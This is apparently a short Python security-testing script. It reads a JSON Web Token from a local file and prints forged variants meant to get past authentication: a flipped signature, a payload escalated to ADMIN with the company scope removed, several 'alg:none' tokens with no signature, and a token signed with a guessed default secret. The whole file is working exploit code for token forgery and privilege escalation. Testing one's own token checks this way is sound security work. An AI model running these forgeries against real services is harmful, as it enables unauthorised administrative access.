import sys, json, base64, hashlib, hmac
tok = open("/tmp/opit.token").read().strip()
h, p, s = tok.split(".")
def b64d(x): return base64.urlsafe_b64decode(x + "=" * (-len(x) % 4))
def b64e(b): return base64.urlsafe_b64encode(b).decode().rstrip("=")
hdr = json.loads(b64d(h)); pl = json.loads(b64d(p))
print("ORIG_HEADER", json.dumps(hdr))
print("ORIG_PAYLOAD", json.dumps(pl))

# 1. middle signature flip (definitely changes signature bytes)
sb = bytearray(b64d(s)); sb[10] ^= 0xFF
print("SIG_MIDDLE_FLIP", f"{h}.{p}.{b64e(bytes(sb))}")

# 2. payload role -> ADMIN, keep original signature
pl2 = dict(pl); pl2["role"] = "ADMIN"; pl2["company_scope"] = None
p2 = b64e(json.dumps(pl2, separators=(',',':')).encode())
print("PAYLOAD_ADMIN_OLDSIG", f"{h}.{p2}.{s}")

# 3. alg:none, no signature
hn = b64e(json.dumps({"alg":"none","typ":"JWT"}, separators=(',',':')).encode())
pl3 = dict(pl); pl3["role"]="ADMIN"; pl3["company_scope"]=None
p3 = b64e(json.dumps(pl3, separators=(',',':')).encode())
print("ALG_NONE_NOSIG", f"{hn}.{p3}.")
print("ALG_NONE_EMPTY", f"{hn}.{p3}")

# 4. alg:none capital None variants
for variant in ["None","NONE","nOnE"]:
    hv = b64e(json.dumps({"alg":variant,"typ":"JWT"}, separators=(',',':')).encode())
    print(f"ALG_{variant}", f"{hv}.{p3}.")

# 5. HS256 signed with the PUBLIC guessable default secret (RS/HS confusion n/a; test weak secret)
sig = hmac.new(b"dev_secret_change_me", f"{h}.{p3}".encode(), hashlib.sha256).digest()
print("HS256_DEFAULTSECRET", f"{h}.{p3}.{b64e(sig)}")
